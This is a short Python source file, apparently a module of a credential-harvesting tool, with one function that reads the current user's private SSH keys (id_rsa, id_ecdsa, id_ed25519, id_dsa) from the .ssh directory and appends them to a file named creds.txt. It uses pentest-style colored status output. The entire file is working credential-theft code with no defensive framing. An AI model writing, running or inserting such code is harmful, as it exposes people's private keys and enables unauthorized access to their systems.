import os
from pathlib import Path
from colorama import Fore, Style

def grab_ssh_keys(verbose=False):
    ssh_dir = Path.home() / ".ssh"
    output_file = "output/creds.txt"

    if not ssh_dir.exists():
        print(Fore.YELLOW + "[!] No .ssh directory found for this user." + Style.RESET_ALL)
        return

    key_files = ["id_rsa", "id_ecdsa", "id_ed25519", "id_dsa"]
    found = False

    with open(output_file, "a") as f:
        for key_name in key_files:
            key_path = ssh_dir / key_name
            if key_path.exists():
                found = True
                try:
                    with open(key_path, "r") as kf:
                        content = kf.read()
                        f.write(f"\n----- {key_name} -----\n{content}\n")
                        if verbose:
                            print(Fore.GREEN + f"[+] Found SSH key: {key_path}" + Style.RESET_ALL)
                except Exception as e:
                    print(Fore.RED + f"[!] Could not read {key_path}: {e}" + Style.RESET_ALL)

    if not found:
        print(Fore.YELLOW + "[!] No private SSH keys found." + Style.RESET_ALL)
    else:
        print(Fore.GREEN + f"[+] SSH keys written to {output_file}" + Style.RESET_ALL)
